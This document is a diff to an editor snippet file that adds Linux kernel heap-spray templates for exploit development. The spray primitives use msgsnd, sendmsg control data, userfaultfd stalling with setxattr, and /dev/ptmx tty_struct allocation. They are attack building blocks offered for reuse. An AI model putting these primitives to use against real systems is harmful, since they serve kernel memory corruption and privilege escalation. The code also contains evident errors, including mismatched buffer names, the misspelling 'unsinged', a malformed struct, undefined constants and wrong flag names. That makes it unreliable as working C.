@@ -1,8 +1,8 @@
-snippet KERNEL_SPRAY_MSGSND "Kernel spray msgsnd >= 48"
+snippet KERNEL_SPRAY_MSGSND "Kernel spray msgsnd controlled from 48 byte"
 #define BUFF_SIZE 0x100
 #define HEAP_SPRAY_TIMES 0x100
 
-void msgsnd_spray(fd){
+void msgsnd_spray(){
   struct {
     int mtype;
     char mtext[BUFF_SIZE];
@@ -16,5 +16,103 @@ void msgsnd_spray(fd){
 
   for(int i = 0; i < HEAP_SPRAY_TIMES; ++i)
     msgsnd(msgid, &msg, BUFF_SIZE, 0);
+}
+endsnippet
+
+snippet KERNEL_SPRAY_SNDMSG "Kernel spray sendmsg controlled from 44 byte"
+#define BUFF_SIZE 0x100
+#define HEAP_SPRAY_TIMES 0x100
+#define SOCK_PORT 6666
+
+void sendmsg_spray(){
+  char buff[BUFF_SIZE];
+  *(uint64_t **)(buf + 40) = &payload;
+
+  struct msghdr msg = {0};
+  struct sockaddr_in addr = {0};
+  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  addr.sin_family = AF_INET;
+  addr.sin_port = htons(SOCK_PORT);
+
+  msg.msg_control = buff;
+  msg.msg_controllen = BUFF_SIZE;
+  msg.msg_name = (caddr_t)&addr;
+  msg.msg_namelen = sizeof(addr);
+
+  for(int i = 0; i < HEAP_SPRAY_TIMES; ++i)
+    sendmsg(sockfd, &msg, 0);
+}
+endsnippet
+
+snippet KERNEL_SPRAY_USERFAULTFD_SETXATTR "Universal kernel heap spray userfaultfd + setxattr"
+#define FAULT_PAGE ((void*))(0x1337000)
+#define SLEEP_FOR 100
+
+void *handler(void *arg){
+  uintptr_t uffd = (uintptr_t)arg;
+
+  struct pollfd pollfd;
+  pollfd.fd = uffd;
+  pollfd.events = POLLIN;
+  if(poll(&pollfd, 1, -1) != 1)
+    exit(-1);
+
+  struct uffdio_msg msg;
+  if(read(uffd, &msg, sizeof(msg)) != sizeof(msg))
+    exit(-1);
+
+  wait(SLEEP_FOR);
+
+  struct uffdio_zeropage uz;
+  uz.range.start = (unsinged long)(FAULT_PAGE + 0x1000);
+  uz.zeropage = 0x1000;
+  uz.mode = 0;
+  ioctl(uffd, UFFDIO_ZEROPAGE, &uz);
+  return NULL;
+}
+
+void spray(){
+  uint64_t uffd = syscall(
+    __NR_userfaultfd,
+    O_CLOEXEC, O_NONBLOCK
+  );
+  if(uffd < 0)
+    exit(-1);
+
+  struct uffdio_api ua;
+  ua.api = UFFDIO_API;
+  ua.features = 0;
+  if(ioctl(uffd, UFFDIO_API, &ua) < 0)
+    exit(-1);
+
+  if(mmap(FAULT_PAGE, 0x2000, 7, 0x22, -1, 0) != FAULT_PAGE)
+    exit(-1);
+
+  struct uffdio_register ur;
+  ur.range.start = (unsigned long)(FAULT_PAGE + 0x1000);
+  ur.range.len = 0x1000;
+  ur.mode = UFFDIO_REGISTER_MODE_MISSING;
+  if(ioctl(uffd, UFFDIO_REGISTER, &ur) < 0)
+    exit(-1);
+
+  struct target{
+    void (*fn){};
+    unsigned long smth;
+  };
+
+  struct target *t = (0x1337000 + 0x1000) - 8;
+  setxattr(NULL, "Blank", &target, 0x16, XATTR_CREATE);
+}
+endsnippet
+
+snippet SPRAY_KERNEL_TTY_STRUCT "Fixed size of 0x2E0"
+#define HEAP_SPRAY_TIMES 100
+int spray_fd[HEAP_SPRAY_TIMES];
+
+for(int i = 0;  i < SPRAY_ALLOC_TIMES; ++i){
+  spray_fd[i] = open("/dev/ptmx", ORDWR | O_NOCCTY);
+  if(spray_fd[i] < 0)
+    exit(-1);
 }
 endsnippet
